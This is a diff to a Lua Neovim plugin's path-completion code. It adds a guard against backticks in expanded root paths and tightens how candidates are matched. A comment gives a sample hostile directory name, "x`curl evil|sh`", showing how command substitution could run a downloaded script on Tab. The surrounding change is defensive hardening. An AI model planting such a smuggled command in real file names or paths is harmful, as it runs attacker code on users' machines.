@@ -151,8 +151,8 @@ M.register("BOOL", {
 ---
 --- A lead naming a root (`${NAME}/x`, `$NAME/x`) is completed on its expansion, and every
 --- candidate is handed back in the spelling the user typed: `getcompletion` itself understands
---- neither `${NAME}` nor a root without an environment variable. A bare `$NA` / `%NA` completes
---- the names of the known roots.
+--- neither `${NAME}` nor a root without an environment variable. A bare `$NA` completes the names of
+--- the known roots.
 ---
 --- A backtick in the lead is a command substitution to Vim's wildcard expansion: a directory named
 --- like "x`curl evil|sh`" in a downloaded folder would run its text the next time <Tab> is pressed
@@ -165,7 +165,7 @@ local function path_completion(arg_lead, kind)
     return {}
   end
 
-  local partial = arg_lead:match("^%$([%w_]*)$") or arg_lead:match("^%%([%w_]*)$")
+  local partial = arg_lead:match("^%$([%w_]*)$")
   if partial then
     local out = {}
     for _, name in ipairs(roots.names()) do
@@ -178,18 +178,26 @@ local function path_completion(arg_lead, kind)
     end
   end
 
-  local _, root, rest = roots.match(arg_lead)
-  if root then
-    local head = arg_lead:sub(1, #arg_lead - #rest)
+  local name, _, rest = roots.match(arg_lead)
+  if name then
     local expanded = roots.expand(arg_lead)
+    -- The root's own path is configuration, but the same backtick rule applies to it: it is the
+    -- text handed to `getcompletion` here, not the lead.
+    if expanded:find("`", 1, true) then
+      return {}
+    end
     local ok, list = pcall(vim.fn.getcompletion, expanded, kind)
     if not ok then
       return {}
     end
+    local head = arg_lead:sub(1, #arg_lead - #rest)
     local out = {}
     for _, cand in ipairs(list) do
-      if cand:sub(1, #root) == root then
-        out[#out + 1] = head .. cand:sub(#root + 1)
+      -- `relative`, not a string-prefix test: `getcompletion` may answer with the other
+      -- separator or another case than the root was spelled with.
+      local below = roots.relative(cand, name)
+      if below then
+        out[#out + 1] = head .. below
       end
     end
     return out
